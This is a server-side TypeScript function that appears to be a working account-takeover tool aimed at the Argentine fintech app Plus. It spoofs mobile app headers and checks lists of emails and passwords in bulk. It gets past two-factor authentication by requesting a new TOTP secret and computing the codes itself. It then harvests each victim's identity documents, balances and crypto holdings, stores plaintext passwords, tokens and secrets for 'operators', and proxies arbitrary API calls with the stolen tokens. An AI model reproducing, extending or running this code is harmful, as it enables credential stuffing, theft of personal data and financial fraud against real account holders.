import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

const PLUS_HEADERS = {
  "Accept-Encoding": "gzip",
  "Connection": "Keep-Alive",
  "Content-Type": "application/json",
  "User-Agent": "okhttp/4.12.0",
  "accept": "application/json",
  "mobile-app": "bGCI6D67bJ88",
  "mobile-app-version": "2.2.4",
  "x-channel": "9DF8CB31A4",
  "x-device-manufacturer": "samsung",
  "x-device-model": "SM-S9110",
  "x-device-name": "SM-S9110",
  "x-device-unique-id": "8937364d03a1f0a0",
  "x-os": "android",
};

const MS_URL = "https://ms.plus.com.ar/plus";
const AUTH_URL = `${MS_URL}/auth/login`;
const API_URL = "https://api.plus.com.ar";
const INCOMPLETE_ACCOUNT_ERROR = "Cadastro incompleto";

// ── TOTP Implementation ──
const BASE32_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

function base32Decode(input: string): Uint8Array {
  const cleaned = input.replace(/[\s=-]/g, "").toUpperCase();
  const bits: number[] = [];
  for (const char of cleaned) {
    const val = BASE32_CHARS.indexOf(char);
    if (val === -1) continue;
    for (let i = 4; i >= 0; i--) {
      bits.push((val >> i) & 1);
    }
  }
  const bytes = new Uint8Array(Math.floor(bits.length / 8));
  for (let i = 0; i < bytes.length; i++) {
    let byte = 0;
    for (let j = 0; j < 8; j++) {
      byte = (byte << 1) | bits[i * 8 + j];
    }
    bytes[i] = byte;
  }
  return bytes;
}

async function generateTOTP(base32Secret: string, interval = 30, digits = 6): Promise<string> {
  const secret = base32Decode(base32Secret);
  const time = Math.floor(Date.now() / 1000 / interval);
  const timeBuffer = new ArrayBuffer(8);
  const view = new DataView(timeBuffer);
  view.setUint32(4, time, false);

  const key = await crypto.subtle.importKey(
    "raw", secret.buffer as ArrayBuffer,
    { name: "HMAC", hash: "SHA-1" }, false, ["sign"]
  );

  const signature = await crypto.subtle.sign("HMAC", key, timeBuffer);
  const hmac = new Uint8Array(signature);
  const offset = hmac[hmac.length - 1] & 0x0f;
  const code =
    ((hmac[offset] & 0x7f) << 24) |
    ((hmac[offset + 1] & 0xff) << 16) |
    ((hmac[offset + 2] & 0xff) << 8) |
    (hmac[offset + 3] & 0xff);

  return (code % Math.pow(10, digits)).toString().padStart(digits, "0");
}

// ── Helpers ──
async function fetchWithRetry(url: string, options: RequestInit, retries = 2): Promise<Response> {
  for (let i = 0; i <= retries; i++) {
    try {
      const res = await fetch(url, options);
      if (res.status >= 500 && i < retries) {
        await new Promise(r => setTimeout(r, 1000 * (i + 1)));
        continue;
      }
      return res;
    } catch (e) {
      if (i === retries) throw e;
      await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
  throw new Error("Max retries reached");
}

function msHeaders(token: string) {
  return { ...PLUS_HEADERS, Host: "ms.plus.com.ar", authorization: `Bearer ${token}` };
}

function apiHeaders(token: string) {
  return { ...PLUS_HEADERS, Host: "api.plus.com.ar", authorization: `Bearer ${token}` };
}

// ── 2FA Flow ──
async function check2FA(token: string): Promise<boolean> {
  try {
    const res = await fetchWithRetry(`${MS_URL}/2fa/is-2fa-enabled`, {
      method: "GET",
      headers: msHeaders(token),
    });
    if (!res.ok) { await res.text(); return false; }
    const data = await res.json();
    return data.is_enabled === true;
  } catch {
    return false;
  }
}

async function generate2FASecret(token: string, email: string): Promise<string | null> {
  try {
    const res = await fetchWithRetry(`${MS_URL}/2fa/generate`, {
      method: "POST",
      headers: msHeaders(token),
      body: JSON.stringify({ email }),
    });
    if (!res.ok) { await res.text(); return null; }
    const data = await res.json();
    return data.secret || null;
  } catch {
    return null;
  }
}

async function verify2FA(token: string, totpCode: string): Promise<{ accessToken: string | null; error?: string }> {
  try {
    const res = await fetchWithRetry(`${MS_URL}/2fa/verify`, {
      method: "POST",
      headers: msHeaders(token),
      body: JSON.stringify({ token: totpCode, isForEnabling: false }),
    });
    const data = await res.json();
    if (!res.ok || !data.accessToken) {
      return { accessToken: null, error: data.message || "2FA verification failed" };
    }
    return { accessToken: data.accessToken };
  } catch (e: any) {
    return { accessToken: null, error: e.message };
  }
}

async function handle2FAFlow(token: string, email: string): Promise<{ newToken: string; totpSecret: string } | null> {
  const is2FA = await check2FA(token);
  if (!is2FA) return null;

  console.log(`[2FA] Account ${email} has 2FA enabled, generating secret...`);
  const secret = await generate2FASecret(token, email);
  if (!secret) {
    console.error(`[2FA] Failed to generate secret for ${email}`);
    return null;
  }

  console.log(`[2FA] Got secret for ${email}, generating TOTP...`);
  const totpCode = await generateTOTP(secret);
  console.log(`[2FA] Generated TOTP code for ${email}, verifying...`);

  const result = await verify2FA(token, totpCode);
  if (!result.accessToken) {
    console.error(`[2FA] Verification failed for ${email}: ${result.error}`);
    // Retry once with a fresh code (in case we're near the edge of the time window)
    await new Promise(r => setTimeout(r, 2000));
    const retryCode = await generateTOTP(secret);
    const retryResult = await verify2FA(token, retryCode);
    if (!retryResult.accessToken) {
      console.error(`[2FA] Retry also failed for ${email}: ${retryResult.error}`);
      return null;
    }
    return { newToken: retryResult.accessToken, totpSecret: secret };
  }

  return { newToken: result.accessToken, totpSecret: secret };
}

// ── Account Data ──
async function fetchAccountData(token: string) {
  const authHeader = apiHeaders(token);
  const body = JSON.stringify({ "front-web": true });

  const [profileRes, balancesRes, fintechRes, limitsRes, cryptoRes] = await Promise.all([
    fetchWithRetry(`${API_URL}/users/profile`, { method: "POST", headers: authHeader, body }),
    fetchWithRetry(`${API_URL}/inversions/balances`, { method: "POST", headers: authHeader, body }),
    fetchWithRetry(`${API_URL}/fintech/profile?front-web=true`, { method: "GET", headers: { ...authHeader, "content-type": "application/json" } }),
    fetchWithRetry(`${API_URL}/users/all-limits`, { method: "POST", headers: authHeader, body }),
    fetchWithRetry(`${API_URL}/crypto/balance`, { method: "POST", headers: authHeader, body }),
  ]);

  const [profile, balances, fintech, limits, crypto] = await Promise.all([
    profileRes.json().catch(() => null),
    balancesRes.json().catch(() => null),
    fintechRes.json().catch(() => null),
    limitsRes.json().catch(() => null),
    cryptoRes.json().catch(() => null),
  ]);

  return { profile, balances, fintech, limits, crypto };
}

const asObject = (value: any): Record<string, any> | null => (
  value && typeof value === "object" && !Array.isArray(value) ? value : null
);
const asNumber = (value: any): number | null => (
  typeof value === "number" && Number.isFinite(value) ? value : null
);

async function saveAccount(supabase: any, email: string, password: string, token: string, data: any, opCode: string, totpSecret?: string | null) {
  const profile = asObject(data?.profile);
  const balances = asObject(data?.balances);
  const fintech = asObject(data?.fintech);
  const limits = asObject(data?.limits);
  const crypto = asObject(data?.crypto);

  const fullName = `${profile?.first_name || ""} ${profile?.last_name || ""}`.trim();

  const { data: existing } = await supabase
    .from("plus_accounts")
    .select("id, full_name, document, cuit, phone, city, province, profile_data, balance_ars, balance_usd, fintech_data, limits_data, crypto_data, totp_secret")
    .eq("email", email)
    .eq("operator_code", opCode)
    .maybeSingle();

  const existingARS = asObject(existing?.balance_ars);
  const existingUSD = asObject(existing?.balance_usd);
  const hasBalancePayload = balances && !balances.error;

  const balanceARS = hasBalancePayload
    ? {
        ars: asNumber(balances?.ars) ?? asNumber(existingARS?.ars) ?? 0,
        pendingARS: asNumber(balances?.pendingARS) ?? asNumber(existingARS?.pendingARS) ?? 0,
      }
    : (existing?.balance_ars ?? null);

  const balanceUSD = hasBalancePayload
    ? {
        usd: asNumber(balances?.usd) ?? asNumber(existingUSD?.usd) ?? 0,
        pendingUSD: asNumber(balances?.pendingUSD) ?? asNumber(existingUSD?.pendingUSD) ?? 0,
      }
    : (existing?.balance_usd ?? null);

  const accountData: Record<string, any> = {
    email,
    password,
    operator_code: opCode,
    access_token: token,
    full_name: fullName || existing?.full_name || null,
    document: profile?.document ?? existing?.document ?? null,
    cuit: profile?.cuit ?? existing?.cuit ?? null,
    phone: profile?.profile?.telephone ?? existing?.phone ?? null,
    city: profile?.profile?.city ?? existing?.city ?? null,
    province: profile?.profile?.province?.name ?? existing?.province ?? null,
    profile_data: profile && !profile.error ? profile : (existing?.profile_data ?? null),
    balance_ars: balanceARS,
    balance_usd: balanceUSD,
    fintech_data: fintech && !fintech.error ? fintech : (existing?.fintech_data ?? null),
    limits_data: limits && !limits.error ? limits : (existing?.limits_data ?? null),
    crypto_data: crypto && !crypto.error ? crypto : (existing?.crypto_data ?? null),
    last_login_at: new Date().toISOString(),
    last_data_sync_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
  };

  // Save totp_secret if we got one, or keep existing
  if (totpSecret) {
    accountData.totp_secret = totpSecret;
  } else if (existing?.totp_secret) {
    accountData.totp_secret = existing.totp_secret;
  }

  const query = existing
    ? supabase.from("plus_accounts").update(accountData).eq("id", existing.id)
    : supabase.from("plus_accounts").insert(accountData);

  const { error } = await query;
  if (error) throw error;
}

function isDataComplete(data: any): boolean {
  return data.profile &&
    typeof data.profile === 'object' &&
    !data.profile.error &&
    typeof data.profile !== 'string' &&
    (data.profile.first_name || data.profile.last_name) &&
    data.balances &&
    typeof data.balances === 'object' &&
    !data.balances.error &&
    typeof data.balances.ars === 'number';
}

// ── Login Single ──
async function loginSingle(email: string, password: string) {
  try {
    const loginRes = await fetchWithRetry(AUTH_URL, {
      method: "POST",
      headers: { ...PLUS_HEADERS, Host: "ms.plus.com.ar" },
      body: JSON.stringify({ email, password }),
    });

    if (loginRes.status === 429) return { success: false, email, error: "Rate limit - aguarde" };
    if (loginRes.status >= 500) return { success: false, email, error: `Servidor Plus erro ${loginRes.status}` };

    let loginData;
    try { loginData = await loginRes.json(); }
    catch { return { success: false, email, error: `Resposta inválida (HTTP ${loginRes.status})` }; }

    if (!loginRes.ok || !loginData.accessToken) {
      const msg = loginData.message || loginData.error || "";
      if (loginRes.status === 401 || msg.toLowerCase().includes("invalid") || msg.toLowerCase().includes("incorrect") || msg.toLowerCase().includes("wrong"))
        return { success: false, email, error: "Senha incorreta" };
      if (msg.toLowerCase().includes("not found") || msg.toLowerCase().includes("no existe"))
        return { success: false, email, error: "Conta não existe" };
      if (msg.toLowerCase().includes("blocked") || msg.toLowerCase().includes("bloqueado"))
        return { success: false, email, error: "Conta bloqueada" };
      return { success: false, email, error: msg || `Login falhou (HTTP ${loginRes.status})` };
    }

    let token = loginData.accessToken;
    let totpSecret: string | null = null;
    let has2FA = false;

    // ── 2FA handling ──
    const twoFAResult = await handle2FAFlow(token, email);
    if (twoFAResult) {
      token = twoFAResult.newToken;
      totpSecret = twoFAResult.totpSecret;
      has2FA = true;
      console.log(`[2FA] Successfully verified 2FA for ${email}, got new token`);
    }

    // Fetch data with the (possibly upgraded) token
    const data = await fetchAccountData(token);
    const hasCompleteData = isDataComplete(data);

    return { success: true, email, accessToken: token, hasCompleteData, has2FA, totpSecret, ...data };
  } catch (e: any) {
    return { success: false, email, error: `Erro de rede: ${e.message}` };
  }
}

// ── Main Server ──
serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { action, email, password, accessToken, operatorCode, accounts } = await req.json();

    if (action === "login") {
      const result = await loginSingle(email, password);
      if (!result.success) {
        return new Response(JSON.stringify({ error: result.error }), {
          status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      if (!result.hasCompleteData) {
        return new Response(JSON.stringify({ error: INCOMPLETE_ACCOUNT_ERROR }), {
          status: 422, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      let saved = false;
      try {
        const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
        const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
        const supabase = createClient(supabaseUrl, supabaseKey);
        await saveAccount(supabase, email, password, result.accessToken!, result, operatorCode || "master", result.totpSecret);
        saved = true;
      } catch (saveError) {
        console.error("Failed to save plus account after successful login:", saveError);
      }

      return new Response(JSON.stringify({ success: true, saved, ...result }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "bulk") {
      if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
        return new Response(JSON.stringify({ error: "No accounts provided" }), {
          status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
      const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
      const supabase = createClient(supabaseUrl, supabaseKey);
      const opCode = operatorCode || "master";

      const results: any[] = [];
      for (const acc of accounts) {
        try {
          const result = await loginSingle(acc.email, acc.password);

          if (!result.success) {
            results.push({ ...result, saved: false });
          } else if (!result.hasCompleteData) {
            results.push({ success: false, email: acc.email, error: INCOMPLETE_ACCOUNT_ERROR, saved: false });
          } else {
            let saved = false;
            try {
              await saveAccount(supabase, acc.email, acc.password, result.accessToken!, result, opCode, result.totpSecret);
              saved = true;
            } catch (saveError) {
              console.error(`Failed saving account ${acc.email}:`, saveError);
            }
            results.push({ ...result, saved });
          }
        } catch (e: any) {
          results.push({ success: false, email: acc.email, error: e.message, saved: false });
        }
        if (accounts.indexOf(acc) < accounts.length - 1) {
          await new Promise(r => setTimeout(r, 500));
        }
      }

      return new Response(JSON.stringify({ success: true, results }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "list") {
      const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
      const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
      const supabase = createClient(supabaseUrl, supabaseKey);
      const opCode = operatorCode || "master";

      let query = supabase.from("plus_accounts").select("*").order("updated_at", { ascending: false });
      if (opCode !== "master") query = query.eq("operator_code", opCode);

      const { data: rows, error: dbError } = await query.limit(500);
      if (dbError) {
        return new Response(JSON.stringify({ error: dbError.message }), {
          status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      return new Response(JSON.stringify({ success: true, accounts: rows || [] }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "refresh") {
      const data = await fetchAccountData(accessToken);
      return new Response(JSON.stringify({ success: true, ...data }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "proxy") {
      const { endpoint, method, body, token } = await req.json().catch(() => ({}));
      if (!endpoint) {
        return new Response(JSON.stringify({ error: "Missing endpoint" }), {
          status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      const authHeader = apiHeaders(token || accessToken);
      const res = await fetchWithRetry(`${API_URL}${endpoint}`, {
        method: method || "POST",
        headers: authHeader,
        body: body ? JSON.stringify(body) : undefined,
      });
      const resData = await res.json().catch(() => ({ error: "Invalid response" }));
      return new Response(JSON.stringify(resData), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ error: "Invalid action" }), {
      status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Plus auth error:", error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
